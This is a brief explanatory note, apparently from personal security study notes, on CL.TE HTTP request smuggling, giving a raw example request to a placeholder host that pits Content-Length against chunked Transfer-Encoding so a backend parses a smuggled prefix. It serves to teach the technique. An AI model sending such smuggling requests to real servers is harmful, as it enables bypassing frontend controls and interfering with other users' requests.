## Descritpion
If the frontend server uses the `Content-Length` header, while backend `Transfer-Encoding`, it is possible to exploit this difference.

Basic exploit:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Basic idea is, that frontend will take 13 bytes (due to Content-Length: 13) but backend will interpret it as chunked, so it'll stop at 0, as is denotes an end in chunked.